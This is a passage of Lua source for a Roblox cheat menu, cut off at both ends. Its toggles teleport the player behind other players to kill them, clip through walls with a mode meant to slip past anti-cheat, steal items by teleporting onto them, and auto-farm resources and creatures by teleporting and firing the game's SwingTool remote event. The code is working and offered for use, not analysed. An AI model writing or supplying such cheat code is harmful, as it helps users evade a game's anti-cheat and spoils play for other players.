								if GetPlayer(string.sub(tostring(KillName.Value), 1)) and isAlive(GetPlayer(string.sub(tostring(KillName.Value), 1))) then
									Target = GetPlayer(string.sub(tostring(KillName.Value), 1))
									local enemyHum = GetPlayer(string.sub(tostring(KillName.Value), 1)).Character.HumanoidRootPart
									hum.CFrame = CFrame.new(enemyHum.Position - enemyHum.CFrame.lookVector * OffsetX.Value / 10 + Vector3.new(0, OffsetY.Value / 10, 0))

								else

								end
							end
						end
					end)
				else
					if Target then
						local enemyHum = game.Players:FindFirstChild(Target).Character.HumanoidRootPart
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(enemyHum.Position)
					end
				end
			end,
			["HoverText"] = "Teleport to your enemy you want to kill",
			["Default"] = false,
			
		})
		RandomizeKill = TeleportKill.CreateDropdown({
			["Name"] = "Mode",
			["List"] = {"Custom", "Randomize"},
			["Function"] = function(val) 
				if KillName["Object"] then
					KillName["Object"].Visible = val == "Custom"
				end
			end
		})
		--[[
		MethodToKill = TeleportKill.CreateDropdown({
			["Name"] = "Method",
			["List"] = {"LookVector", "Round"},
			["Function"] = function(val) 
			end
		})	
		]]
		KillName = TeleportKill.CreateTextBox({
			["Name"] = "Player Name",
			["TempText"] = "Player Name",
			["HoverText"] = "the person you want to kill"
		})
		OffsetX = TeleportKill.CreateSlider({
			["Name"] = "Offset X",
			["Min"] = 0,
			["Max"] = 200, 
			["Default"] = 40,
			["Function"] = function(val) end,
		})
		OffsetY = TeleportKill.CreateSlider({
			["Name"] = "Offset Y",
			["Min"] = -200,
			["Max"] = 200, 
			["Default"] = 0,

			["Function"] = function(val) end,
		})
		KillName["Object"].Visible = false
		KillName["Object"].Visible = RandomizeKill["Value"] == "Custom"

	end)

	runcode(function()
		local phase = {["Enabled"] = false}
		local spidergoinup = false
		local holdingshift = false
		local phasemode = {["Value"] = "Normal"}
		local phaselimit = {["Value"] = 1}
		local phaseparts = {}

		phase = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Phase", 
			["Function"] = function(callback)
				if callback then
					spawn(function()
						BindToStepped("Phase", 1, function()
							if isAlive(game.Players.LocalPlayer) then
								if phasemode["Value"] == "Normal" then
									for i, part in pairs(lplr.Character:GetDescendants()) do
										if part:IsA("BasePart") and part.CanCollide == true then
											phaseparts[part] = true
											part.CanCollide = (false and (not holdingshift))
										end
									end
								else
									local chars = {}
									for i,v in pairs(players:GetChildren()) do
										table.insert(chars, v.Character)
									end
									local pos = game.Players.LocalPlayer.character.HumanoidRootPart.CFrame.p - Vector3.new(0, 1, 0)
									local pos2 = game.Players.LocalPlayer.character.HumanoidRootPart.CFrame.p + Vector3.new(0, 1, 0)
									local pos3 = game.Players.LocalPlayer.character.Head.CFrame.p
									local raycastparameters = RaycastParams.new()
									raycastparameters.FilterDescendantsInstances = chars
									raycastparameters.FilterType = Enum.RaycastFilterType.Blacklist
									local newray = workspace:Raycast(pos3, game.Players.LocalPlayer.character.Humanoid.MoveDirection, raycastparameters)
									if newray and not holdingshift then
										local dir = newray.Normal.Z ~= 0 and "Z" or "X"
										if newray.Instance.Size[dir] <= phaselimit["Value"] and newray.Instance.CanCollide then
											game.Players.LocalPlayer.character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.character.HumanoidRootPart.CFrame + (newray.Normal * (-(newray.Instance.Size[dir]) - 2))
										end
							--[[if isPointInMapOccupied(getScaffold(pos, false) + (newray.Normal * -6)) and isPointInMapOccupied(getScaffold(pos2, false) + (newray.Normal * -6)) then
								phasedelay = tick() + 0.075
								phasedelay2 = tick() + 0.1
								slowdownspeed = true
								nocheck = true
								game.Players.LocalPlayer.character.HumanoidRootPart.CFrame = addvectortocframe(game.Players.LocalPlayer.character.HumanoidRootPart.CFrame, (newray.Normal * -2.5))
							end]]
									end
								end
							end
						end)
					end)
				else
					UnbindFromStepped("Phase")

					for i,v in pairs(phaseparts) do
						if i then
							i.CanCollide = true
						end
					end
					table.clear(phaseparts)
				end
			end,
			["HoverText"] = "Lets you Phase/Clip through walls. (Hold shift to use phase over spider)"
		})
		phasemode = phase.CreateDropdown({
			["Name"] = "Mode",
			["List"] = {"Normal", "AntiCheat"},
			["Function"] = function(val) 
				if phaselimit["Object"] then
					phaselimit["Object"].Visible = val == "AntiCheat"
				end
			end
		})
		phaselimit = phase.CreateSlider({
			["Name"] = "Studs",
			["Function"] = function() end,
			["Min"] = 1,
			["Max"] = 20,
			["Default"] = 5,
		})
		phaselimit["Object"].Visible = false
		phaselimit["Object"].Visible = phasemode["Value"] == "AntiCheat"

	end)

	runcode(function()
		local HipHeightPower = {["Value"] = 5}
		local HipHeight = {["Enabled"] = false}
		HipHeight = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
			["Name"] = "HipHeight", 
			["Function"] = function(callback)
				if callback then
					spawn(function()
						while game:GetService("RunService").Heartbeat:Wait() and HipHeight.Enabled == true do
							if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
								game.Players.LocalPlayer.Character:FindFirstChild("Humanoid").HipHeight = HipHeightPower.Value
							end
						end
					end)
				else
					game.Players.LocalPlayer.Character:FindFirstChild("Humanoid").HipHeight = 2
				end
			end,
			["HoverText"] = "Lets you jump higher"
		})
		HipHeightPower = HipHeight.CreateSlider({
			["Name"] = "HipHeight",
			["Min"] = 0,
			["Max"] = 50, 
			["Function"] = function(val) end,
			["Default"] = 2
		})

	end)

	runcode(function()
		local TeleportSteal = {["Enabled"] = false}
		local SecondDelay = {["Value"] = 10}
		local OffsetY = {["Value"] = 10}
		local Method = {["Value"] = "Custom"}
		local ItemToSteal = {["RefreshValues"] = function() end, ["ObjectList"] = {}}
		local IsHitting = false
		TeleportSteal = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
			["Name"] = "TeleportSteal", 
			["Function"] = function(callback)
				if callback then
					spawn(function()
						while wait() and TeleportSteal.Enabled == true do
							if Method.Value == "Custom" then
								for i,e in pairs(game.Workspace.Items:GetChildren()) do
									if e.Name == (ItemToSteal["ObjectList"][math.random(1, #ItemToSteal["ObjectList"])]) then
										local item = e
										for i,v in pairs(item:GetChildren()) do
											if v.ClassName == "Part" and IsHitting == false then
												IsHitting = true
												repeat
													game:GetService("RunService").Heartbeat:Wait()
													if IsHitting == true and TeleportSteal.Enabled == true then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position + Vector3.new(0, OffsetY.Value / 10, 0)) end
												until e.Parent ~= game.Workspace.Items or Method.Value ~= "Custom" or TeleportSteal.Enabled == false
												wait(SecondDelay.Value / 10)
												IsHitting = false
												return
											end
										end
									end
								end
							end
							if Method.Value == "Random" then
								for i,e in pairs(game.Workspace.Items:GetChildren()) do
									for i,v in pairs(e:GetChildren()) do

										if v.ClassName == "Part" and IsHitting == false then
											IsHitting = true
											repeat
												game:GetService("RunService").Heartbeat:Wait()
												if IsHitting == true and TeleportSteal.Enabled == true then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position + Vector3.new(0, OffsetY.Value / 10, 0)) end
											until e.Parent ~= game.Workspace.Items or Method.Value ~= "Random" or TeleportSteal.Enabled == false
											wait(SecondDelay.Value / 10)
											IsHitting = false
											return
										end
									end
								end
							end
						end
					end)


				else
				end
			end,
			["HoverText"] = "Steal stuff and teleport to the item"
		})
		Method = TeleportSteal.CreateDropdown({
			["Name"] = "Method",
			["List"] = {
				"Custom", 
				"Random",
			},
			["Function"] = function(val)
				if ItemToSteal["Object"] then
					ItemToSteal["Object"].Visible = val == "Custom"
				end
			end
		})
		ItemToSteal = TeleportSteal.CreateTextList({
			["Name"] = "Item",
			["TempText"] = "Item",
		})
		SecondDelay = TeleportSteal.CreateSlider({
			["Name"] = "Delay",
			["Min"] = 1,
			["Max"] = 100, 
			["Function"] = function(val) end,
			["Default"] = 10
		})
		OffsetY = TeleportSteal.CreateSlider({
			["Name"] = "OffsetY",
			["Min"] = -200,
			["Max"] = 200, 
			["Function"] = function(val) end,
			["Default"] = 50
		})


	end)

	runcode(function()
		local HighJumpMethod = {["Value"] = "Toggle"}
		local HighJumpBoost = {["Value"] = 1}
		local HighJumpDelay = {["Value"] = 20}
		local HighJumpTick = tick()
		local highjumpbound = true
		local HighJump = {["Enabled"] = false}
		local uis = game:GetService("UserInputService")
		HighJump = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
			["Name"] = "InfiniteJump", 
			["Function"] = function(callback)
				if callback then
					spawn(function()
						local UIS = game:GetService'UserInputService';

						function Action(Object, Function) if Object ~= nil then Function(Object); end end

						UIS.InputBegan:connect(function(UserInput)
							if UserInput.UserInputType == Enum.UserInputType.Keyboard and UserInput.KeyCode == Enum.KeyCode.Space and HighJump.Enabled == true then
								Action(game.Players.LocalPlayer.Character.Humanoid, function(self)
									if self:GetState() == Enum.HumanoidStateType.Jumping or self:GetState() == Enum.HumanoidStateType.Freefall then
										Action(self.Parent.HumanoidRootPart, function(self)
											self.Velocity = Vector3.new(0, HighJumpBoost.Value, 0);
										end)
									end
								end)
							end
						end)
					end)

				else
				end
			end,
			["HoverText"] = "Lets you jump higher"
		})
		HighJumpBoost = HighJump.CreateSlider({
			["Name"] = "Boost",
			["Min"] = 1,
			["Max"] = 1000, 
			["Function"] = function(val) end,
			["Default"] = 100
		})

	end)

	runcode(function()

		local DisconnectRejoin = {["Enabled"] = false}

		DisconnectRejoin = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Disconect Rejoin",
			["Function"] = function(callback)
				spawn(function()

					repeat wait() until game.CoreGui:FindFirstChild('RobloxPromptGui')

					local lp,po,ts = game:GetService('Players').LocalPlayer,game.CoreGui.RobloxPromptGui.promptOverlay,game:GetService('TeleportService')

					po.ChildAdded:connect(function(a)
						if a.Name == 'ErrorPrompt' and DisconnectRejoin.Enabled == true then
							repeat
								ts:Teleport(game.PlaceId)
								wait(2)
							until false
						end
					end)
				end)
			end,
			["HoverText"] = "if you get disconnected then you can rejoin",
			["Default"] = false,
			
		})

	end)

	runcode(function()

		local MineAura = {["Enabled"] = false}
		local range = {["Value"] = 7}
		local ItemData = require(game:GetService("ReplicatedStorage").Modules.ItemData)
		local did = 1

		MineAura = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
			["Name"] = "MineAura",
			["Function"] = function(callback)
				spawn(function()

					local char = game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name)
					while wait(0.4) and MineAura.Enabled == true do
						if did == 1 then
							did = 0
							for i,resource in pairs(game.Workspace.Resources:GetChildren()) do
								for _,part in pairs(resource:GetChildren()) do
									if part.ClassName == "Part" or part.ClassName == "MeshPart" then
										if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - part.Position).Magnitude <= range.Value then
											for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
												if v.ClassName == "Model" then
													if ItemData[v.Name].useType == "Slash" then
														local one = game:GetService("ReplicatedStorage").RelativeTime.Value
														local two = {part,part,part,part}
														game:GetService("ReplicatedStorage").Events.SwingTool:FireServer(one, two)
													end
												end
											end
										end
									end
								end
							end
						end
						if did == 0 then
							did = 1
							for i,resource in pairs(game.Workspace.Critters:GetChildren()) do
								for _,part in pairs(resource:GetChildren()) do
									if part.ClassName == "Part" or part.ClassName == "MeshPart" then
										if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - part.Position).Magnitude <= range.Value then
											for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
												if v.ClassName == "Model" then
													if ItemData[v.Name].useType == "Slash" then
														local one = game:GetService("ReplicatedStorage").RelativeTime.Value
														local two = {part,part,part,part}
														game:GetService("ReplicatedStorage").Events.SwingTool:FireServer(one, two)
													end
												end
											end
										end
									end
								end
							end

						end
					end
				end)
			end,
			["HoverText"] = "hits resources and critters automaticly",
			["Default"] = false,
			
		})
		range = MineAura.CreateSlider({
			["Name"] = "range",
			["Min"] = 0,
			["Max"] = 20,
			["Function"] = function(val)
			end,
			["Default"] = 7
		})

		local AutoFarm = {["Enabled"] = false}
		local AutoFarmName = {["Value"] = "Small Tree"}
		local AutoFarmWait = {["Value"] = 20}

		local WaitUntillBreak = false
		AutoFarm = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
			["Name"] = "AutoFarm",
			["Function"] = function(callback)
				if callback then
					spawn(function()
						local char = game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name)
						createwarning("AutoFarm", "This is very risky", 5)
						while game:GetService("RunService").Heartbeat:Wait() and AutoFarm.Enabled == true do
							if MineAura.Enabled == false then
								MineAura["ToggleButton"](false)
							end
							if game.Workspace.Resources:FindFirstChild("Small Tree") and AutoFarmName.Value == "Small Tree" then

								local orgin = game.Workspace.Resources:FindFirstChild("Small Tree")
								local teleport = orgin.Trunk

								if AutoFarmName.Value == "Small Tree" and orgin.Name == "Small Tree" and AutoFarm.Enabled == true then
									repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true and AutoFarmName.Value == "Small Tree" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
									until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Small Tree"
									WaitUntillBreak = true
									wait(AutoFarmWait.Value / 10)
									WaitUntillBreak = false
								end
							end
							if game.Workspace.Resources:FindFirstChild("Sun Tree") and AutoFarmName.Value == "Sun Tree" then

								local orgin = game.Workspace.Resources:FindFirstChild("Sun Tree")
								local teleport = orgin.Trunk

								if AutoFarmName.Value == "Sun Tree" and orgin.Name == "Sun Tree" and AutoFarm.Enabled == true then
									repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true and AutoFarmName.Value == "Sun Tree" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
									until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Sun Tree"
									WaitUntillBreak = true
									wait(AutoFarmWait.Value / 10)
									WaitUntillBreak = false
								end
							end
							if game.Workspace.Resources:FindFirstChild("Small Rock") and AutoFarmName.Value == "Small Rock" then

								local orgin = game.Workspace.Resources:FindFirstChild("Small Rock")
								local teleport
								if orgin:FindFirstChild("Small Rock") then
									teleport = orgin["Small Rock"]
								else
									teleport = orgin["Small Stone"]
								end

								if AutoFarmName.Value == "Small Rock" and orgin.Name == "Small Rock" and AutoFarm.Enabled == true then
									repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true and AutoFarmName.Value == "Small Rock" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
									until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Small Rock"
									WaitUntillBreak = true
									wait(AutoFarmWait.Value / 10)
									WaitUntillBreak = false
								end
							end
							if AutoFarmName.Value == "Gold Node" then

								for i,orgin in pairs(game.Workspace.Resources:GetChildren()) do
									if orgin.ClassName == "Model" then
										if orgin.Name == "Gold Node" then

											if AutoFarmName.Value == "Gold Node" and AutoFarm.Enabled == true and orgin:FindFirstChild("Reference") then
												local teleport = orgin["Reference"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true and AutoFarmName.Value == "Gold Node" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,3,0)) end 
												until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Gold Node"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
									end
								end

							end
							if game.Workspace.Resources:FindFirstChild("Crystal Lode") and AutoFarmName.Value == "Crystal Lode" then

								local orgin = game.Workspace.Resources:FindFirstChild("Crystal Lode")
								local teleport = orgin["Crystal Bit"]

								if AutoFarmName.Value == "Crystal Lode" and orgin.Name == "Crystal Lode" and AutoFarm.Enabled == true then
									repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true and AutoFarmName.Value == "Crystal Lode" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
									until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Crystal Lode"
									WaitUntillBreak = true
									wait(AutoFarmWait.Value / 10)
									WaitUntillBreak = false
								end
							end
							if AutoFarmName.Value == "Stone Shelly" then
								for i,orgin in pairs(game.Workspace.Critters:GetChildren()) do
									if orgin.ClassName == "Model" then
										if orgin.Name == "Stone Shelly"
										then

											if AutoFarmName.Value == "Stone Shelly" and AutoFarm.Enabled == true and orgin:FindFirstChild("HitShell") then
												local teleport = orgin["HitShell"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true and AutoFarmName.Value == "Stone Shelly" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,5,0)) end 
												until orgin.Parent ~= game.Workspace.Critters or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Stone Shelly"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
									end
								end
							end

							if game.Workspace.Resources:FindFirstChild("Goober") and AutoFarmName.Value == "Goober" then

								local orgin = game.Workspace.Resources:FindFirstChild("Goober")
								local teleport = orgin["Leaves"]

								if AutoFarmName.Value == "Goober" and orgin.Name == "Goober" and AutoFarm.Enabled == true then
									repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true and AutoFarmName.Value == "Goober" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,4,0)) end 
									until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Goober"
									WaitUntillBreak = true
									wait(AutoFarmWait.Value / 10)
									WaitUntillBreak = false
								end
							end


							if game.Workspace.Resources:FindFirstChild("Iron Node") and AutoFarmName.Value == "Iron Node" then

								local orgin = game.Workspace.Resources:FindFirstChild("Iron Node")
								local teleport = orgin["Reference"]

								if AutoFarmName.Value == "Iron Node" and orgin.Name == "Iron Node" and AutoFarm.Enabled == true then
									repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
											and AutoFarmName.Value == "Iron Node" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
									until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Iron Node"
									WaitUntillBreak = true
									wait(AutoFarmWait.Value / 10)
									WaitUntillBreak = false
								end
							end
							if game.Workspace.Resources:FindFirstChild("Silver Node") and AutoFarmName.Value == "Silver Node" then

								local orgin = game.Workspace.Resources:FindFirstChild("Silver Node")
								local teleport = orgin["Reference"]

								if AutoFarmName.Value == "Silver Node" and orgin.Name == "Silver Node" and AutoFarm.Enabled == true then
									repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
											and AutoFarmName.Value == "Silver Node" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
									until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Silver Node"
									WaitUntillBreak = true
									wait(AutoFarmWait.Value / 10)
									WaitUntillBreak = false
								end
							end
							if game.Workspace.Resources:FindFirstChild("Bush") and AutoFarmName.Value == "Bush" then

								local orgin = game.Workspace.Resources:FindFirstChild("Bush")
								local teleport = orgin["Leaves"]

								if AutoFarmName.Value == "Bush" and orgin.Name == "Bush" and AutoFarm.Enabled == true then
									repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
											and AutoFarmName.Value == "Bush" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
									until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Bush"
									WaitUntillBreak = true
									wait(AutoFarmWait.Value / 10)
									WaitUntillBreak = false
								end
							end
							if game.Workspace.Resources:FindFirstChild("Ancient Tree") and AutoFarmName.Value == "Ancient Tree" then

								local orgin = game.Workspace.Resources:FindFirstChild("Ancient Tree")
								local teleport = orgin["Trunk"]

								if AutoFarmName.Value == "Ancient Tree" and orgin.Name == "Ancient Tree" and AutoFarm.Enabled == true then
									repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
											and AutoFarmName.Value == "Ancient Tree" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
									until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Ancient Tree"
									WaitUntillBreak = true
									wait(AutoFarmWait.Value / 10)
									WaitUntillBreak = false
								end
							end
							if game.Workspace.Resources:FindFirstChild("Coal Node") and AutoFarmName.Value == "Coal Node" then

								local orgin = game.Workspace.Resources:FindFirstChild("Coal Node")
								local teleport = orgin["Reference"]

								if AutoFarmName.Value == "Coal Node" and orgin.Name == "Coal Node" and AutoFarm.Enabled == true then
									repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
											and AutoFarmName.Value == "Coal Node" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
									until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Coal Node"
									WaitUntillBreak = true
									wait(AutoFarmWait.Value / 10)
									WaitUntillBreak = false
								end
							end


							if game.Workspace.Resources:FindFirstChild("Cactus") and AutoFarmName.Value == "Cactus" then

								local orgin = game.Workspace.Resources:FindFirstChild("Cactus")
								local teleport = orgin["Reference"]

								if AutoFarmName.Value == "Cactus" and orgin.Name == "Cactus" and AutoFarm.Enabled == true then
									repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
											and AutoFarmName.Value == "Cactus" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
									until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Cactus"
									WaitUntillBreak = true
									wait(AutoFarmWait.Value / 10)
									WaitUntillBreak = false
								end
							end
							if game.Workspace.Resources:FindFirstChild("Driftwood") and AutoFarmName.Value == "Driftwood" then

								local orgin = game.Workspace.Resources:FindFirstChild("Driftwood")
								local teleport = orgin["Reference"]

								if AutoFarmName.Value == "Driftwood" and orgin.Name == "Driftwood" and AutoFarm.Enabled == true then
									repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
											and AutoFarmName.Value == "Driftwood" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,0,0)) end 
									until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Driftwood"
									WaitUntillBreak = true
									wait(AutoFarmWait.Value / 10)
									WaitUntillBreak = false
								end
							end

							if game.Workspace.Resources:FindFirstChild("Ice Chunk") and AutoFarmName.Value == "Ice Chunk" then
								for i,orgin in pairs(game.Workspace.Resources:GetChildren()) do
									if orgin.ClassName == "Model" then
										if orgin.Name == "Ice Chunk"
										then
											if AutoFarmName.Value == "Ice Chunk" and AutoFarm.Enabled == true and orgin:FindFirstChild("Reference") then
												local teleport = orgin["Reference"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
														and AutoFarmName.Value == "Ice Chunk" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,5,0)) end 
												until orgin.Parent ~= game.Workspace.Resources or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Ice Chunk"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
									end
								end
							end

							if AutoFarmName.Value == "Banto" then
								for i,orgin in pairs(game.Workspace.Critters:GetChildren()) do
									if orgin.ClassName == "Model" then
										if orgin.Name == "Banto"
										then

											if AutoFarmName.Value == "Banto" and AutoFarm.Enabled == true and orgin:FindFirstChild("HumanoidRootPart") then
												local teleport = orgin["HumanoidRootPart"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
														and AutoFarmName.Value == "Banto" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,5,0)) end 
												until orgin.Parent ~= game.Workspace.Critters or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Banto"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
									end
								end
							end

							if AutoFarmName.Value == "Bantae" then
								for i,orgin in pairs(game.Workspace.Critters:GetChildren()) do
									if orgin.ClassName == "Model" then
										if orgin.Name == "Bantae"
										then

											if AutoFarmName.Value == "Bantae" and AutoFarm.Enabled == true and orgin:FindFirstChild("HumanoidRootPart") then
												local teleport = orgin["HumanoidRootPart"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
														and AutoFarmName.Value == "Bantae" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,5,0)) end 
												until orgin.Parent ~= game.Workspace.Critters or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Bantae"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
									end
								end
							end

							if AutoFarmName.Value == "Peeper" then
								for i,orgin in pairs(game.Workspace.Critters:GetChildren()) do
									if orgin.ClassName == "Model" then
										if orgin.Name == "Peeper"
										then

											if AutoFarmName.Value == "Peeper" and AutoFarm.Enabled == true and orgin:FindFirstChild("Reference") then
												local teleport = orgin["Reference"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
														and AutoFarmName.Value == "Peeper" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,5,0)) end 
												until orgin.Parent ~= game.Workspace.Critters or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Peeper"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
									end
								end
							end

							if AutoFarmName.Value == "Coal Shelly" then
								for i,orgin in pairs(game.Workspace.Critters:GetChildren()) do
									if orgin.ClassName == "Model" then
										if orgin.Name == "Coal Shelly"
										then

											if AutoFarmName.Value == "Coal Shelly" and AutoFarm.Enabled == true and orgin:FindFirstChild("HitShell") then
												local teleport = orgin["HitShell"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
														and AutoFarmName.Value == "Coal Shelly" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,5,0)) end 
												until orgin.Parent ~= game.Workspace.Critters or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Coal Shelly"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
									end
								end
							end

							if AutoFarmName.Value == "Gold Shelly" then
								for i,orgin in pairs(game.Workspace.Critters:GetChildren()) do
									if orgin.ClassName == "Model" then
										if orgin.Name == "Gold Shelly"
										then

											if AutoFarmName.Value == "Gold Shelly" and AutoFarm.Enabled == true and orgin:FindFirstChild("HitShell") then
												local teleport = orgin["HitShell"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
														and AutoFarmName.Value == "Gold Shelly" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,5,0)) end 
												until orgin.Parent ~= game.Workspace.Critters or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Gold Shelly"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
									end
								end
							end

							if AutoFarmName.Value == "Adurite Shelly" then
								for i,orgin in pairs(game.Workspace.Critters:GetChildren()) do
									if orgin.ClassName == "Model" then
										if orgin.Name == "Adurite Shelly"
										then

											if AutoFarmName.Value == "Adurite Shelly" and AutoFarm.Enabled == true and orgin:FindFirstChild("HitShell") then
												local teleport = orgin["HitShell"]
												repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
														and AutoFarmName.Value == "Adurite Shelly" then char.HumanoidRootPart.CFrame = CFrame.new(teleport.Position + Vector3.new(0,5,0)) end 
												until orgin.Parent ~= game.Workspace.Critters or AutoFarm.Enabled == false or AutoFarmName.Value ~= "Adurite Shelly"
												WaitUntillBreak = true
												wait(AutoFarmWait.Value / 10)
												WaitUntillBreak = false
											end
										end
									end
								end
							end


							if game.Workspace.Resources:FindFirstChild("Crystal Guardian") and AutoFarmName.Value == "Crystal Guardian" then

								local orgin = game.Workspace.Resources:FindFirstChild("Crystal Guardian")
								local teleport = orgin["Crystal Guardian"]

								if AutoFarmName.Value == "Crystal Guardian" and orgin.Name == "Crystal Guardian" and AutoFarm.Enabled == true then
									repeat game:GetService("RunService").Heartbeat:Wait() if WaitUntillBreak == false and AutoFarm.Enabled == true 
